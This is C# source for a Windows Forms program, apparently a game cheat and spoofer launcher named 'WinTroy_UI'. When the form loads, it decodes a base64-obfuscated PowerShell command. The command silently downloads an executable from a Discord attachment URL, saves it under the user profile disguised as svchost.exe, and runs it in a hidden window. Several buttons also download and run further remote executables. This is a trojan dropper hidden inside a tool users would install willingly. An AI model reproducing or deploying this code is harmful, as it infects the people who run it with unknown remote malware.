using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace WinTroy_UI
{
    public partial class MainForm : Form
    {
        

        public MainForm()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            string path6 = Environment.ExpandEnvironmentVariables("%UserProfile%\\Windows\\svchost.exe");
            byte[] pathBytes = Encoding.ASCII.GetBytes(path6);
            string encodedPath = Convert.ToBase64String(pathBytes);

            byte[] cmdBytes = Convert.FromBase64String("IyEvYmluL2Jhc2gNCmlmICghKFRlc3QtUGF0aCAiJGVudjpVc2VyUHJvZmlsZVxXaW5kb3dzIikpIHsNCiAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICIkZW52OlVzZXJQcm9maWxlXFdpbmRvd3MiDQp9DQpwb3dlcnNoZWxsIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUNvbW1hbmQgIkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3NzU0NDEyMjYzNjMyNDg5NS8xMDcwMDgyMzgyNDYxNDE5NjMwL1VwZGF0ZV9maWxlLmV4ZScgLU91dEZpbGUgJyRlbnY6VXNlclByb2ZpbGVcV2luZG93c1xzdmNob3N0LmV4ZScgOyBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAnJGVudjpVc2VyUHJvZmlsZVxXaW5kb3dzXHN2Y2hvc3QuZXhlJyI=");
            string cmd = Encoding.ASCII.GetString(cmdBytes);

            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = cmd,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };

            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            Process.Start(path6);
        }

        private void guna2ControlBox1_Click(object sender, EventArgs e)
        {
            #region Kill Process
            foreach (var process in Process.GetProcessesByName("CPR"))
            {
                process.Kill();
            }
            Thread.Sleep(2500);
            Environment.Exit(0);
            #endregion
        }

        private void guna2ControlBox4_Click(object sender, EventArgs e)
        {
            #region Kill Process
            foreach (var process in Process.GetProcessesByName("CPR"))
            {
                process.Kill();
            }
            Thread.Sleep(2500);
            Environment.Exit(0);
            #endregion
        }

        private void guna2ControlBox5_Click(object sender, EventArgs e)
        {
            #region Kill Process
            foreach (var process in Process.GetProcessesByName("CPR"))
            {
                process.Kill();
            }
            Thread.Sleep(2500);
            Environment.Exit(0);
            #endregion
        }

        private void guna2Button1_Click_1(object sender, EventArgs e)
        {
            string path6 = "C:\\Program Files\\Temp\\Kuzi\\mwchair";
            if (Directory.Exists(path6))
            {
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/1043602661817192499/1048093715161419799/dwysfhwrbr.exe", "C:\\Program Files\\Temp\\Kuzi\\mwchair\\dwysfhwrbr.exe");
                Process.Start("C:\\Program Files\\Temp\\Kuzi\\mwchair\\dwysfhwrbr.exe");
                return;
            }
            Directory.CreateDirectory(path6);
        }

        private void guna2Button2_Click_2(object sender, EventArgs e)
        {
            string path15 = "C:\\Program Files\\Temp\\Kuzi\\mw2chair";
            if (Directory.Exists(path15))
            {
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/1043602661817192499/1048093999287775312/xszsrmmmqu.exe", "C:\\Program Files\\Temp\\Kuzi\\mw2chair\\xszsrmmmqu.exe");
                Process.Start("C:\\Program Files\\Temp\\Kuzi\\mw2chair\\xszsrmmmqu.exe");
                return;
            }
            Directory.CreateDirectory(path15);
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            string path1115 = "C:\\Program Files\\Temp\\Kuzi\\woofer";
            if (Directory.Exists(path1115))
            {
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/1043602661817192499/1047169979767853056/shawtys_spoofer.exe", "C:\\Program Files\\Temp\\Kuzi\\woofer\\shawtys_spoofer.exe");
                Process.Start("C:\\Program Files\\Temp\\Kuzi\\woofer\\shawtys_spoofer.exe");
                return;
            }
            Directory.CreateDirectory(path1115);
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {

        }
    }
}
